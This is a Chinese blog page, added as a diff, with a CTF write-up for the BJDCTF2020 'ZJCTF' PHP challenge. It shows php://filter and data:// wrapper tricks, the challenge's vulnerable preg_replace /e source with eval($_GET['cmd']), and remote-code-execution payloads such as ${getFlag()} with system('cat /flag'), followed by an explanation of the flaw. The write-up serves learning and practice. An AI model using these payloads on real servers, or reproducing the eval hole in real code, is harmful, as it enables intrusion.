@@ -1,0 +1,269 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[BJDCTF2020]ZJCTF，不过如此 | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[BJDCTF2020]ZJCTF，不过如此</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/9
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509210053534.png" alt="image-20240509210053534"></p>
+<p>include后面有个next的注释，猜测使用data伪协议读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是绕过text了</p>
+<p>需要控制参数text利用伪协议写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、使用php://input</span><br><span class="line">	?text=php://input</span><br><span class="line">	post:I have a dream</span><br><span class="line">2、使用data://</span><br><span class="line">	?text=data:text/plain,I have a dream</span><br><span class="line">	?text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br></pre></td></tr></table></figure>
+
+<p>随便采取某种方法吧</p>
+<p>最后都会得到</p>
+<p>一串字符串</p>
+<p>base64解码之后会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看到complex那，那里有一个漏洞，文章最后会进行讲解</p>
+<p>主要动作就是</p>
+<p>preg_replace(‘.*’)&#x2F;ei’,’strtolower(“\1”)’, {${此处填函数名}});</p>
+<p>这个函数可以是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br><span class="line">即查看phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>也就是可以直接把{}内的东西当代码执行</p>
+<p>在这里我们尝试一下这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>发现不行</p>
+<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509213631533.png" alt="image-20240509213631533"></p>
+<p>被过滤了</p>
+<p>尝试一下使用post传入数据</p>
+<p><img src="/2024/05/09/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240509213750785.png" alt="image-20240509213750785"></p>
+<p>拿到flag</p>
+<p>还有一种方法</p>
+<p>就是通过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;getFlag()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用getFlag函数</p>
+<p>之后可以传cmd上去执行</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="rce漏洞"><a href="#rce漏洞" class="headerlink" title="rce漏洞"></a>rce漏洞</h4><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。我们来看看 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> 中对其的描述：</p>
+<blockquote>
+<p><strong>反向引用</strong></p>
+<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+</blockquote>
+<p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项，我们拿 <strong>ripstech</strong> 官方给的 <strong>payload</strong> 进行分析，方便大家理解。官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>&#x2F;?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p>
+<p>有时候.会被过滤</p>
+<p>可以考虑换为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
